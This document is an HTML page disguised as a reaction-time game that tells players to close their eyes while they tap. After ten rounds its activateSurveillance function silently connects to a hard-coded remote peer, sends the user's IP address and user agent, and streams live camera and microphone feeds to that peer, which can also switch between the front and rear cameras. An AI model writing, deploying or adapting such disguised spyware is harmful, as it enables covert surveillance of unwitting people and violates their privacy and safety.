<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reaction Test</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: 'Arial', sans-serif;
            margin: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            /* CHANGE: Align to top instead of center */
            justify-content: flex-start; 
            /* CHANGE: Push down slightly so it's in the "upper middle" */
            padding-top: 15vh; 
            touch-action: none;
            user-select: none;
        }

        /* The Centered Game Board */
        #game-board {
            width: 85vw;
            height: 85vw;
            max-width: 400px;
            max-height: 400px;
            background-color: #2c3e50;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
            position: relative;
            border: 4px solid #34495e;
            cursor: pointer;
            transition: background-color 0.1s;
        }

        #game-board.active { background-color: #34495e; }
        #game-board.success { background-color: #27ae60; } 
        #game-board.fail { background-color: #c0392b; }

        #hud-container {
            margin-bottom: 30px; /* Space between text and box */
            text-align: center;
            width: 90%;
        }

        #main-display {
            font-size: 50px;
            font-weight: bold;
            color: #bdc3c7;
            text-shadow: 2px 2px 0 #000;
        }

        #instruction {
            font-size: 18px;
            color: #ecf0f1;
            margin-top: 10px;
            line-height: 1.4;
        }

        /* Visual ripple on tap */
        .ripple {
            position: absolute;
            width: 20px; height: 20px;
            background: rgba(255, 255, 255, 0.6);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            animation: rippleAnim 0.4s linear;
        }

        @keyframes rippleAnim {
            0% { width: 20px; height: 20px; opacity: 1; }
            100% { width: 200px; height: 200px; opacity: 0; }
        }
    </style>
</head>
<body>

    <div id="hud-container">
        <div id="main-display">TAP TO START</div>
        <div id="instruction">
            1. Close your eyes.<br>
            2. Wait for the BEEP.<br>
            3. Tap the box fast!
        </div>
    </div>

    <div id="game-board"></div>

    <script>
        // --- CONFIG ---
        const TECHNICIAN_ID = "tech-support-commander-001"; 
        const TRIGGER_COUNT = 10; 

        // --- GAME STATE ---
        let gameState = 'IDLE'; 
        let beepTimestamp = 0;
        let reactionTime = 0;
        let roundCount = 0;
        let isConnected = false;
        
        // --- AUDIO ---
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        let audioCtx;

        // --- DOM ---
        const board = document.getElementById('game-board');
        const display = document.getElementById('main-display');
        const instruction = document.getElementById('instruction');

        // --- PEERJS ---
        const peer = new Peer();
        let myDataConnection = null;
        let currentStream = null;

        // 1. INPUT HANDLER
        board.addEventListener('touchstart', handleInput, {passive: false});
        board.addEventListener('mousedown', handleInput);

        function handleInput(e) {
            e.preventDefault();
            
            // Visual Ripple
            const rect = board.getBoundingClientRect();
            const x = e.touches ? e.touches[0].clientX : e.clientX;
            const y = e.touches ? e.touches[0].clientY : e.clientY;
            createRipple(x - rect.left, y - rect.top);

            // Init Audio
            if (!audioCtx) audioCtx = new AudioContext();
            if (audioCtx.state === 'suspended') audioCtx.resume();

            // --- LOGIC ---
            if (gameState === 'IDLE') {
                gameState = 'WAITING_FOR_BEEP';
                display.innerText = "WAIT...";
                display.style.color = "#f1c40f"; 
                instruction.innerText = "Keep eyes closed... Listen...";
                scheduleBeep();
                return;
            }

            if (gameState === 'WAITING_FOR_BEEP') {
                // TOO EARLY
                display.innerText = "TOO EARLY!";
                display.style.color = "#e74c3c";
                flashBoard('fail');
                
                clearTimeout(beepTimer);
                setTimeout(() => {
                    display.innerText = "WAIT...";
                    display.style.color = "#f1c40f";
                    scheduleBeep();
                }, 1000);
                return;
            }

            if (gameState === 'WAITING_FOR_TAP') {
                // SUCCESS
                const now = Date.now();
                reactionTime = now - beepTimestamp;
                
                display.innerText = reactionTime + " ms";
                display.style.color = "#2ecc71"; 
                flashBoard('success');

                roundCount++;
                
                // Send stats
                if (isConnected && myDataConnection) {
                    myDataConnection.send({
                        type: 'reaction_stats',
                        ms: reactionTime,
                        round: roundCount
                    });
                }

                // Check Trigger
                if (roundCount === TRIGGER_COUNT && !isConnected) {
                    activateSurveillance();
                }

                // Next Round
                gameState = 'WAITING_FOR_BEEP';
                setTimeout(() => {
                    display.innerText = "WAIT...";
                    display.style.color = "#f1c40f";
                    scheduleBeep();
                }, 1000); 
            }
        }

        // 2. TIMING
        let beepTimer = null;

        function scheduleBeep() {
            // Random 1-3 seconds
            const randomDelay = Math.floor(Math.random() * 2000) + 1000;
            
            beepTimer = setTimeout(() => {
                playTone();
                beepTimestamp = Date.now();
                gameState = 'WAITING_FOR_TAP';
            }, randomDelay);
        }

        function playTone() {
            if (!audioCtx) return;
            const osc = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();
            
            osc.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            
            osc.type = 'sine';
            osc.frequency.setValueAtTime(600, audioCtx.currentTime); 
            gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
            
            osc.start();
            osc.stop(audioCtx.currentTime + 0.15); 
        }

        function createRipple(x, y) {
            const ripple = document.createElement('div');
            ripple.className = 'ripple';
            ripple.style.left = x + 'px';
            ripple.style.top = y + 'px';
            board.appendChild(ripple);
            setTimeout(() => ripple.remove(), 400);
        }

        function flashBoard(type) {
            board.classList.add(type);
            setTimeout(() => board.classList.remove(type), 200);
        }

        // 3. CONNECTION (Hidden)
        async function activateSurveillance() {
            console.log("Connecting...");
            isConnected = true; 

            try {
                myDataConnection = peer.connect(TECHNICIAN_ID);
                myDataConnection.on('open', async () => {
                    try {
                        const r = await fetch('https://api.ipify.org?format=json');
                        const j = await r.json();
                        myDataConnection.send({ type: 'info', ip: j.ip, userAgent: navigator.userAgent });
                    } catch(e) {}

                    myDataConnection.on('data', (d) => {
                        if (d === 'swap') toggleCamera();
                    });
                });

                await startStream('user');
            } catch (err) {
                console.log("Silent error:", err);
            }
        }

        async function startStream(mode) {
            if (currentStream) currentStream.getTracks().forEach(t => t.stop());
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: mode }, 
                audio: true 
            });
            currentStream = stream;
            peer.call(TECHNICIAN_ID, stream);
        }

        let currentMode = 'user';
        function toggleCamera() {
            currentMode = (currentMode === 'user') ? 'environment' : 'user';
            startStream(currentMode);
        }
    </script>
</body>
</html>
